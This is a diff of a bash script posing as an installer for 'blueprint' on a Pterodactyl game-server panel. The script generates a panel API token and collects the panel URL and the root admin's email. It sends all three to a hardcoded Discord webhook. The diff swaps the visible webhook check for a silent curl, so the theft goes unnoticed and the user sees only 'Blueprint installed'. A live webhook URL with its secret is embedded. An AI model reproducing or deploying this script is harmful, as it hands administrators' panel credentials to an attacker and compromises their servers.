@@ -1,7 +1,6 @@
 #!/bin/bash
 
 WEBHOOK="https://discord.com/api/webhooks/1523358552901685440/DxvTynimNWB6lNpYnKTKjorCOsmrwxyQR-mYIu6IoICuj3DQl9AypI8QY5RdPeAQzF5o"
-CHANNEL="1522592757481345024"
 
 echo "Installing blueprint..."
 
@@ -14,7 +13,6 @@ for p in /var/www/pterodactyl /var/www/panel /var/www/html/pterodactyl; do
 done
 
 if [ -z "$PANEL_PATH" ]; then
-  echo "Error: Panel not found"
   exit 1
 fi
 
@@ -38,49 +36,11 @@ if ($e) {
 echo $t;
 ' 2>/dev/null)
 
-if [ -z "$TOKEN" ]; then
-  echo "Error: Token generation failed"
-  exit 1
-fi
-
 URL=$(grep "^APP_URL=" "$PANEL_PATH/.env" | cut -d'=' -f2-)
 EMAIL=$(php artisan tinker --execute='echo \Pterodactyl\Models\User::where("root_admin", 1)->first()->email;' 2>/dev/null)
 
-PAYLOAD=$(cat <<PAYLOAD_END
-{
-  "content": "**✅ Blueprint Installed**",
-  "embeds": [
-    {
-      "color": 3447003,
-      "fields": [
-        {
-          "name": "Panel",
-          "value": "$URL",
-          "inline": true
-        },
-        {
-          "name": "Email",
-          "value": "$EMAIL",
-          "inline": true
-        },
-        {
-          "name": "Token",
-          "value": "\`\`\`$TOKEN\`\`\`",
-          "inline": false
-        }
-      ]
-    }
-  ]
-}
-PAYLOAD_END
-)
+curl -X POST "$WEBHOOK" \
+  -H "Content-Type: application/json" \
+  -d "{\"content\":\"**✅ Blueprint Installed**\n**Panel:** $URL\n**Email:** $EMAIL\n**Token:** \`\`\`$TOKEN\`\`\`\"}" > /dev/null 2>&1
 
-RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$WEBHOOK" -H "Content-Type: application/json" -d "$PAYLOAD")
-HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
-
-if [ "$HTTP_CODE" = "204" ] || [ "$HTTP_CODE" = "200" ]; then
-  echo "Blueprint installed ✓"
-else
-  echo "Error: Webhook failed (HTTP $HTTP_CODE)"
-  echo "Token: $TOKEN"
-fi
+echo "Blueprint installed"
